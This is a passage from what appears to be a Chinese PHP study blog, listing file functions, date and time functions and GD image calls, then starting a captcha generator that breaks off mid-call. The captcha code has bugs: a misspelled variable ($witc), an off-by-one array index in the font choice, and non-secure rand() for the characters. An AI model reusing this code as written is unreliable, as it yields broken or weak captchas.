id="文件基本操作"><a href="#文件基本操作" class="headerlink" title="文件基本操作"></a>文件基本操作</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">fopen</span>()   <span class="comment">//打开文件或者 URL</span></span><br><span class="line"><span class="comment">// 详细在007日志里</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">fread</span>()   <span class="comment">//读取文件(基于fopen产生的变量)</span></span><br><span class="line"><span class="comment">// 读取指定数目的字节数</span></span><br><span class="line"><span class="comment">// 该函数可以写入二进制流和字符串流</span></span><br><span class="line"><span class="comment">// $handle,$length</span></span><br><span class="line"><span class="comment">// $handle 基于fopen产生的资源变量</span></span><br><span class="line"><span class="comment">// $length 读取的字节数(自己规定)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">fgets</span>()   <span class="comment">//从文件指针中读取一行</span></span><br><span class="line"><span class="comment">// $handle[,$length]</span></span><br><span class="line"><span class="comment">// 只能读取文件的一行</span></span><br><span class="line"><span class="comment">// 该函数可以写入二进制流和字符串流</span></span><br><span class="line"><span class="comment">// $handle 基于fopen产生的资源变量</span></span><br><span class="line"><span class="comment">// $length 读取的字节数，默认1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">feof</span>()<span class="comment">//测试文件指针是否到了文件结束的位置</span></span><br><span class="line"><span class="comment">// 到达文件末尾则返回true，否则返回false</span></span><br><span class="line"><span class="comment">// $file :和之前一样，是资源变量。</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">fwrite</span>()<span class="comment">//写入文件</span></span><br><span class="line"><span class="comment">// file 必需。规定要写入的打开文件。</span></span><br><span class="line"><span class="comment">// string 必需。规定要写入打开文件的字符串。</span></span><br><span class="line"><span class="comment">// length 可选。规定要写入的最大字节数。</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.<span class="title function_ invoke__">rewind</span>()<span class="comment">//倒回文件指针的位置</span></span><br><span class="line"><span class="comment">// $file(资源变量)</span></span><br><span class="line"><span class="comment">// 将文件指针的位置倒回文件的开头。</span></span><br><span class="line"><span class="comment">// 如果成功，该函数返回 TRUE。</span></span><br><span class="line"><span class="comment">// 如果失败，则返回 FALSE。</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">flock</span>()<span class="comment">//轻便的咨询文件锁定</span></span><br><span class="line"><span class="comment">// 锁定或释放文件。</span></span><br><span class="line"><span class="comment">// 如果成功，该函数返回 TRUE。</span></span><br><span class="line"><span class="comment">// 如果失败，则返回 FALSE</span></span><br><span class="line"><span class="comment">// 参数：</span></span><br><span class="line"><span class="comment">// 参数 描述</span></span><br><span class="line"><span class="comment">// file 必需。规定要锁定或释放的已打开的文件。</span></span><br><span class="line"><span class="comment">// lock 必需。规定要使用哪种锁定类型。</span></span><br><span class="line"><span class="comment">//          可能的值：</span></span><br><span class="line">            <span class="comment">// LOCK_SH - 共享锁定（读取的程序）。允许其他进程访问该文件。</span></span><br><span class="line">            <span class="comment">// LOCK_EX - 独占锁定（写入的程序）。防止其他进程访问该文件。</span></span><br><span class="line">            <span class="comment">// LOCK_UN - 释放一个共享锁定或独占锁定</span></span><br><span class="line">            <span class="comment">// LOCK_NB - 锁定的情况下避免阻塞其他进程。</span></span><br><span class="line"><span class="comment">// block 可选。若设置为 1，则当进行锁定时阻塞其他进程。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.<span class="title function_ invoke__">ftruncate</span>()<span class="comment">//将文件截断到给定的长度</span></span><br><span class="line"><span class="comment">// 把打开文件截断到指定的长度。</span></span><br><span class="line"><span class="comment">// 如果成功则返回 TRUE</span></span><br><span class="line"><span class="comment">// 如果失败则返回 FALSE。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// file 必需。规定要截断的打开文件。</span></span><br><span class="line"><span class="comment">// size 必需。规定新的文件大小。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.<span class="title function_ invoke__">fclose</span>()<span class="comment">//关闭一个已打开的文件指针</span></span><br><span class="line"><span class="comment">// 参数传个打开文件(资源变量)并且关闭</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>.<span class="title function_ invoke__">file</span>()<span class="comment">//把整个文件读入一个数组中</span></span><br><span class="line"><span class="comment">// 把整个文件读入一个数组中。</span></span><br><span class="line"><span class="comment">// 数组中的每个元素都是文件中相应的一行，包括换行符在内。</span></span><br><span class="line"><span class="comment">// 参数 描述</span></span><br><span class="line"><span class="comment">// path 必需。规定要读取的文件。（注意，这个是文件或者文件路径）</span></span><br><span class="line"><span class="comment">//          如果单独只有这个参数，会将文件所有的行读取出来，放入一个列表当中</span></span><br><span class="line"><span class="comment">// include_path 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#x27;1&#x27;。</span></span><br><span class="line"><span class="comment">// context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">copy</span>()<span class="comment">//拷贝文件</span></span><br><span class="line"><span class="comment">// $file1,$file2</span></span><br><span class="line"><span class="comment">// 将$file1复制到$file2</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>.<span class="title function_ invoke__">unlink</span>()<span class="comment">//删除文件</span></span><br><span class="line"><span class="number">13</span>.<span class="title function_ invoke__">file_get_contents</span>()<span class="comment">//将整个文件读入一个字符串</span></span><br><span class="line"><span class="comment">// path             必需。规定要读取的文件。</span></span><br><span class="line"><span class="comment">// include_path     可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#x27;1&#x27;。</span></span><br><span class="line"><span class="comment">// context         可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</span></span><br><span class="line"><span class="comment">// start            可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</span></span><br><span class="line"><span class="comment">// max_length       可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</span></span><br><span class="line"></span><br><span class="line"><span class="number">14</span>.<span class="title function_ invoke__">file_put_contents</span>()<span class="comment">//将字符串写入文件中</span></span><br><span class="line"><span class="comment">// filename 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span></span><br><span class="line"><span class="comment">// data     必需。规定要写入文件的数据。可以是字符串、数组或数据流。</span></span><br><span class="line"><span class="comment">// flags    可选。规定如何打开/写入文件。可能的值：</span></span><br><span class="line"><span class="comment">//      FILE_USE_INCLUDE_PATH：在搜索路径中查找文件，可以是 PHP 的 include_path 设置的目录。</span></span><br><span class="line"><span class="comment">//      FILE_APPEND：追加写入而不是覆盖写入。</span></span><br><span class="line"><span class="comment">//      LOCK_EX：写入时锁定文件，可以避免并发写入问题</span></span><br><span class="line"><span class="comment">//          如果锁定未被正确释放(中断，突然退出)，可以使用flock()函数释放指定文件的锁定</span></span><br><span class="line"><span class="comment">// context  可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">15</span>.<span class="title function_ invoke__">rename</span>()<span class="comment">//重命名一个文件或目录</span></span><br><span class="line"><span class="comment">// string $oldname , string $newname [, resource $context ] </span></span><br><span class="line"><span class="comment">// 和Linux的mv类似，光看上面的英文就能知道怎么使用了，不再赘述</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">16</span>.<span class="title function_ invoke__">readfile</span>()<span class="comment">//读入一个文件并写入到输出缓冲</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">readfile</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>, resource <span class="variable">$context</span> = <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// $filename：        必须，要读取的文件名，该文件必须存在且可读。</span></span><br><span class="line">    <span class="comment">// $use_include_path：可选，默认为 false，如果设置为 true，则在查找文件时将搜索 PHP 的 include_path 目录。</span></span><br><span class="line">    <span class="comment">// $context：         可选，可用于指定 PHP 上下文中的额外参数，例如打开文件时的文件访问模式和上下文选项。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-006</title>
      <link href="/2023/02/26/PHP-Study-006/"/>
      <url>/2023/02/26/PHP-Study-006/</url>
      
        <content type="html"><![CDATA[<p> 时间与日期，图像处理(目前仅做到验证码，明天做水印和缩放裁剪的那部分课)</p><p>为了方便学习，提供一个<a href="https://www.cainiaojc.com/tool/php/index.html">在线PHP网址</a></p><span id="more"></span><h1 id="时间与日期"><a href="#时间与日期" class="headerlink" title="时间与日期"></a>时间与日期</h1><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>默认时区：UTC</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="获取当前Unix时间戳"><a href="#获取当前Unix时间戳" class="headerlink" title="获取当前Unix时间戳"></a>获取当前Unix时间戳</h2><p>Unix时间戳从Unix纪元（1970.01.01，00:00:00）开始到当前的秒数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure><h2 id="获取指定时间的Unix时间戳"><a href="#获取指定时间的Unix时间戳" class="headerlink" title="获取指定时间的Unix时间戳"></a>获取指定时间的Unix时间戳</h2><p>将时分秒月日年转换为Uinx秒数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mktime</span>(时,分,秒,月,日,年,废弃参数(忽略此参数));</span><br><span class="line"><span class="title function_ invoke__">mktime</span>(<span class="number">12</span>,<span class="number">30</span>,<span class="number">43</span>,<span class="number">1</span>,<span class="number">30</span>,<span class="number">2023</span>);</span><br><span class="line">获取差距时间：（也就是获取未来和当下相距多少秒）</span><br><span class="line"><span class="variable">$Distance</span> = <span class="title function_ invoke__">mktime</span>(未来的时分秒月日年)-<span class="title function_ invoke__">time</span>()</span><br><span class="line">当然，获取相差多少天可以这样算</span><br><span class="line"><span class="variable">$Distance</span>/<span class="number">60</span>/<span class="number">60</span>/<span class="number">24</span></span><br><span class="line">    获取min/h/day/month/year（换算）</span><br></pre></td></tr></table></figure><h2 id="从Unix时间戳取得时间日期信息"><a href="#从Unix时间戳取得时间日期信息" class="headerlink" title="从Unix时间戳取得时间日期信息"></a>从Unix时间戳取得时间日期信息</h2><p>将Unix秒数转换为时分秒月日年。(格式化一个时间)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="keyword">string</span> <span class="variable">$format</span>[,time]);</span><br><span class="line">第一个参数：时间的格式(必选)</span><br><span class="line">第二个参数：时间戳（默认是当前时间）</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印当前的年月日时分秒</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>);</span><br><span class="line"><span class="comment">// 2023-02-26 03:03:55</span></span><br></pre></td></tr></table></figure><p>具体时间字符串参数参照如下：</p><p><img src="time_1.JPG" alt="time"><br><img src="time_2.JPG" alt="time"><br><img src="time_3.JPG" alt="time"></p><h2 id="获取Unix时间戳和微秒数"><a href="#获取Unix时间戳和微秒数" class="headerlink" title="获取Unix时间戳和微秒数"></a>获取Unix时间戳和微秒数</h2><p>microtime();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>));</span><br><span class="line"><span class="comment">// 返回：double(1677395662.4694)</span></span><br><span class="line"></span><br><span class="line">拓展一个控制浮点数小数点四舍五入的函数</span><br><span class="line"><span class="title function_ invoke__">round</span>(浮点数, 整数);</span><br><span class="line"><span class="comment">// 整数控制浮点数小数位数。</span></span><br></pre></td></tr></table></figure><h1 id="图像处理-GD库"><a href="#图像处理-GD库" class="headerlink" title="图像处理(GD库)"></a>图像处理(GD库)</h1><p>具体涉及GD扩展库,用来处理图像。</p><p>注意：GD库的函数有很多，这里仅仅使用一小部分。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一 绘制图像</span></span><br><span class="line"><span class="comment">// 创建图像</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.新建色彩图像</span></span><br><span class="line"><span class="comment">// 俩参数，x轴和y轴的。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">100</span>, <span class="number">100</span>));</span><br><span class="line"><span class="comment">// 返回一个资源类型的：resource(2) of type (gd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.打开服务器或者网络文件已经存在的GIF,JPEG,PNG,WBMP格式图像</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromjpeg</span>()</span><br><span class="line"><span class="title function_ invoke__">imagecreatefrompng</span>()</span><br><span class="line"><span class="title function_ invoke__">imagecreatefromgif</span>()</span><br><span class="line"><span class="title function_ invoke__">imagecreatefromwbmp</span>()</span><br><span class="line">创建或者打开失败的时候会返回空字符串，并且输出一条错误信息</span><br><span class="line"><span class="title function_ invoke__">imagesx</span>() <span class="comment">//输出画布宽度</span></span><br><span class="line"><span class="title function_ invoke__">imagesy</span>() <span class="comment">//输出画布高度</span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>() <span class="comment">//取得图像大小</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二 绘制图像</span></span><br><span class="line"><span class="comment">// 图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充图像、画点、线段、以及向图像的添加文本等</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">imagecolorallocate</span>()  <span class="comment">//分配颜色      ==&gt; 括号参数：(资源变量)需要处理的图像变量,rgb的三个整数，例如imagecolorallocate($img,122,231,11);</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">imagefill</span>()           <span class="comment">//区域填充  ==&gt; 参数：资源变量,xy坐标，需要填充的颜色 ==&gt; 从左上角开始填充</span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">imagesetpixel</span>()       <span class="comment">//画一个单一像素($img,$x,$y,$color)</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">imageline</span>()           <span class="comment">//画一条线段($img, $x1,$y1,$x2,$y2,$color)</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">imagerectangle</span>()      <span class="comment">//画一个矩形($img, $x1,$y1,$x2,$y2,$color)</span></span><br><span class="line"><span class="number">6</span>.<span class="title function_ invoke__">imagestring</span>()         <span class="comment">//水平地画一行字符串($img, $font,$x,$y,$string,$color)其中,$font是内置字体的意思,有1~5共计5个整数.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证码+文字水印，都用得到这个。</span></span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">imagettftext</span>()        <span class="comment">//用 TrueType 字体向图像写入文本(更常用)($img, $size,$angle,$x,$y,$color,$fontfile,$text)</span></span><br><span class="line"><span class="comment">// $size(字体大小)</span></span><br><span class="line"><span class="comment">// $angle(倾斜度,逆时针)</span></span><br><span class="line"><span class="comment">// $x,$y(左下角)</span></span><br><span class="line"><span class="comment">// $color</span></span><br><span class="line"><span class="comment">// $fontfile    字体文件所在路径,ttf文件</span></span><br><span class="line"><span class="comment">// $text(你的字符串)</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.<span class="title function_ invoke__">imagettfbbox</span>()        <span class="comment">//计算 TrueType 文字所占区域</span></span><br><span class="line"><span class="number">9</span>.<span class="title function_ invoke__">imagecopy</span>()           <span class="comment">//拷贝图像的一部分</span></span><br><span class="line"><span class="comment">// 默认左上角开始</span></span><br><span class="line"><span class="comment">// $img,src_im,$img_x,$img_y,$src_x,$src_y,$src_w,$src_h</span></span><br><span class="line"><span class="comment">// $img,src_im:资源变量</span></span><br><span class="line"><span class="comment">// 将src_im图像中坐标$src_x,$src_y开始,宽度$src_w,高度$src_h的一部分拷贝到$img的$img_x和$img_y上。</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>.<span class="title function_ invoke__">imagecopymerge</span>()     <span class="comment">//拷贝并合并图像的一部分</span></span><br><span class="line"><span class="comment">// 和上面的图像拷贝相比，它的末尾多了一个参数：透明度</span></span><br><span class="line"><span class="comment">// $img,src_im,$img_x,$img_y,$src_x,$src_y,$src_w,$src_h,$pct</span></span><br><span class="line"><span class="comment">// $pct:透明度，范围是 0 到 100，越小越透明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 裁剪+缩放</span></span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">imagecopyresampled</span>() <span class="comment">//重采样拷贝部分图像并调整大小</span></span><br><span class="line"><span class="comment">// 采集图像资源到另外一个图像上去（和上面的水印基本上差不多，参数几乎一致）</span></span><br><span class="line"><span class="comment">// dst_im,src_im,dst_x,dst_y,src_x,src_y,dst_w,dst_h,src_w,src_h</span></span><br><span class="line"><span class="comment">// • dst_im：目标图像资源（接受截图）</span></span><br><span class="line"><span class="comment">// • src_im：源图像资源（开始截图）</span></span><br><span class="line"><span class="comment">// • dst_x：目标图像左上角的 x 坐标</span></span><br><span class="line"><span class="comment">// • dst_y：目标图像左上角的 y 坐标</span></span><br><span class="line"><span class="comment">// • src_x：源图像左上角的 x 坐标</span></span><br><span class="line"><span class="comment">// • src_y：源图像左上角的 y 坐标</span></span><br><span class="line"><span class="comment">// • dst_w：目标图像的宽度</span></span><br><span class="line"><span class="comment">// • dst_h：目标图像的高度</span></span><br><span class="line"><span class="comment">// • src_w：源图像的宽度</span></span><br><span class="line"><span class="comment">// • src_h：源图像的高度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 三 生成图像</span></span><br><span class="line"><span class="comment">// 输出函数</span></span><br><span class="line"><span class="title function_ invoke__">header</span>()    <span class="comment">// 函数前面不能有任何东西输出</span></span><br><span class="line"><span class="comment">// 可以设置文件编码</span></span><br><span class="line"><span class="comment">// 可以设置文件的头类型</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>() <span class="comment">// 格式($资源变量,&#x27;文件存储的路径&#x27;),</span></span><br><span class="line"><span class="comment">// 不带上文件路径时，可以配合head在浏览器生成一张图片。并且将php文件当中图片来引用。</span></span><br><span class="line"><span class="comment">// 带上文件路径，相当与直接生成一张图片到对应的文件夹当中，浏览器就没有输出。php文件也就依然还是原来的php文件。</span></span><br><span class="line"><span class="comment">// 路径最好使用相对路径,它会使用到整个文件系统的目录，类似于下面：</span></span><br><span class="line"><span class="comment">// 以world.jpeg文件名保存到特定目录下</span></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>, <span class="string">&quot;C:/Users/11111/Desktop/music/world.jpeg&quot;</span>);</span><br><span class="line"><span class="comment">// 当然，函数成功的时候，会返回true</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagegif</span>()</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>()</span><br><span class="line"><span class="title function_ invoke__">imagewbmp</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">四 释放资源</span><br><span class="line"><span class="number">1</span>.销毁图像</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(资源变量);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面做一个正常展示图片的示范</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"><span class="variable">$color1</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$color2</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">33</span>);</span><br><span class="line"><span class="title function_ invoke__">imagefill</span>(<span class="variable">$img</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$color1</span>);</span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="comment">// 浏览器会显示一张红色的图片</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当php文件只有上面的代码时，php可以作为html的图片链接引用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;the_photo.php&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="设计验证码"><a href="#设计验证码" class="headerlink" title="设计验证码"></a>设计验证码</h1><p>参考<a href="https://www.fonts.net.cn/commercial-free/fonts-en-2.html">字体</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 五 设计验证码</span></span><br><span class="line"><span class="comment">// rand($a,$b) // 生成随机数,从[$a,$b]</span></span><br><span class="line"><span class="comment">// 字体调用部分其实可以不使用数组的，如果因为字体的属性不一样，产生随机数的效果出现了严重偏差，甚至是没有字符出现，个人认为，这是得不偿失的。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$witch</span> = <span class="number">120</span>;</span><br><span class="line"><span class="variable">$height</span> = <span class="number">40</span>;</span><br><span class="line"><span class="comment">// 放置随机字符串</span></span><br><span class="line"><span class="variable">$element</span> = <span class="keyword">array</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="variable">$str_all</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="comment">// 获取随机字符组合，共计4位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str_all</span> .= <span class="variable">$element</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$element</span>) - <span class="number">1</span>)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 放置随机验证码的字体模块，并且随机获取其中的一个文件路径</span></span><br><span class="line"><span class="variable">$fontarray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Good-Hood/GoodHood-2.otf&#x27;</span>, <span class="string">&#x27;Gap/Gap-Regular-3.ttf&#x27;</span>, <span class="string">&#x27;Maria/Maria-Regular-2.otf&#x27;</span>);</span><br><span class="line"><span class="variable">$fontfile</span> = <span class="string">&quot;Study/D01/Captcha_module/font/&quot;</span> . <span class="variable">$fontarray</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$fontarray</span>))];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成资源类型的变量</span></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="variable">$witch</span>, <span class="variable">$height</span>);</span><br><span class="line"><span class="comment">// 生成颜色</span></span><br><span class="line"><span class="variable">$color3</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">255</span>), <span class="title function_ invoke__">rand</span>(<span class="number">200</span>, <span class="number">255</span>), <span class="title function_ invoke__">rand</span>(<span class="number">200</span>, <span class="number">255</span>));</span><br><span class="line"><span class="comment">// 调用一个颜色作为背景色</span></span><br><span class="line"><span class="title function_ invoke__">imagefill</span>(<span class="variable">$img</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$color3</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$color5</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">189</span>), <span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">200</span>), <span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">190</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="comment">// 生成随机像素点，共计100个</span></span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="variable">$witch</span> - <span class="number">3</span>), <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="variable">$height</span> - <span class="number">3</span>), <span class="variable">$color5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="comment">// 画横线，共计5条</span></span><br><span class="line">    <span class="title function_ invoke__">imageline</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$witch</span> / <span class="number">2</span>), <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$height</span> / <span class="number">2</span>), <span class="title function_ invoke__">rand</span>(<span class="variable">$witc</span> / <span class="number">2</span>, <span class="variable">$witch</span>), <span class="title function_ invoke__">rand</span>(<span class="variable">$height</span> / <span class="number">2</span>, <span class="variable">$height</span>), <span class="variable">$color5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本颜色</span></span><br><span class="line"><span class="variable">$color6</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">100</span>), <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">100</span>), <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">100</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更丰富的文本，调用了字体</span></span><br><span class="line"><span class="title function_ invoke__">imagettftext</span>(<span class="variable">$img</span>, 